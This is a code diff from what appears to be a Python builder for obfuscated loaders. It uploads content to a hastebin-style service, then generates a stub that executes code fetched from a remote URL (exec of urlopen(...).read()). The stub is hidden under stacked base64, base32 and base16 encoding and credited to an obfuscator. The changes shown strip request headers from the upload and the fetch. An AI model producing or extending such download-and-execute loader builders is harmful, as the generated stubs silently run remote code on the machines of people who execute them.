@@ -152,8 +152,7 @@ def build():
     content = "# obfuscated with https://github.com/billthegoat356/Jawbreaker\n\n# by billythegoat356\n\n# <3\n\n\n" + content
 
     try:
-        response = post(service + "/create", data=content.encode('utf-8'),
-                        headers={"Bypass-Tunnel-Reminder": "yea"})
+        response = post(service + "/create", data=content.encode('utf-8'))
 
         if response.status_code == 404:
             input(Col.red+"Error! Hastebin service is maybe down."+Col.white)
@@ -179,7 +178,7 @@ def build():
     chars_list = random()
     Col.printf("Creating content list...")
     file_1.write(f"{chars_list}=[];")
-    content = f"""{exc}({urlp}({req}("{url}",headers={{"user-agent":"a"}})).read())"""
+    content = f"""{exc}({urlp}({req}("{url}")).read())"""
 
     Col.printf("Encoding content...")
     content = b16encode(b32encode(b64encode(content.encode(encoding)))).decode(encoding)
